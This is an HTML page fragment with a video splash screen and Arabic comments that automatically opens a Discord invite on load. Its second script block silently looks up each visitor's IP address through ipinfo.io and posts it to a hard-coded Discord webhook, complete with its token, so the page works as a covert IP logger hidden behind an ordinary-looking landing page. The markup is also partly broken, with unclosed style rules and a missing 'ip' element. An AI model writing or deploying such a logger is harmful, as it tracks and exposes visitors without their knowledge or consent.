    * {

    }

    html, body {
      height: 100%;
      overflow: hidden;
      font-family: 'Courier New', Courier, monospace;

    /* Splash Screen */
    .splash-screen {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: 9999;
      overflow: hidden;
      background-color: black;
    }

    .splash-screen video {
      height: 100%;
      width: 100%;
      object-fit: cover;
    }

    /* Main content (hidden until splash ends) */
    .main-content {
      display: none;
      height: 100%;
      width: 100%;
      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
      background-size: cover;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;

    .main-content.loaded {
      display: flex;
    }

    .info {
      font-size: 1.4em;
      text-shadow: 0 0 8px White, 0 0 15px White, 0 0 25px White;
      letter-spacing: 2px;
    }

    .text {
      font-size: 3em;
      text-shadow: 0 0 10px White;
      letter-spacing: 5px;
      margin-top: 2vh;
    }
  </style>
</head>
<body>

<!-- Splash Screen with Video -->
<div class="splash-screen">

<!-- Main Page Content -->
<div class="main-content" id="mainContent">

</div>

<script>
  // يظهر المحتوى الرئيسي ويخفي شاشة البداية
  function showMainContent() {
    document.querySelector('.splash-screen').style.display = 'none';
    document.getElementById('mainContent').classList.add('loaded');
  }

  // احتياط: إذا ما اشتغل الفيديو بعد 10 ثواني
  setTimeout(showMainContent, 10000);

  // فتح رابط الديسكورد
  function openNewTab() {
    window.open('https://discord.gg/erzhHvmNSH', '_blank');
  }
  openNewTab();
</script>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1401402084624044032/SAhbEAqKtHeaXxs1HJR3aHmQGwhlw5hes8HEWE9kxkAn3R2IgYE9W1iF7dqZbGJPFgrP";

    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        document.getElementById('ip').textContent = ip;
        const payload = {
          content: ` New Visitor IP: \`${ip}\``
        };

        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        }).then(res => {
          console.log("IP sent to Discord.");
        }).catch(err => {
          console.error("Failed to send to Discord:", err);
        });

      })
      .catch(error => {
        document.getElementById('ip').textContent = "Failed to load IP.";
        console.error("IP fetch error:", error);
      });
  </script>
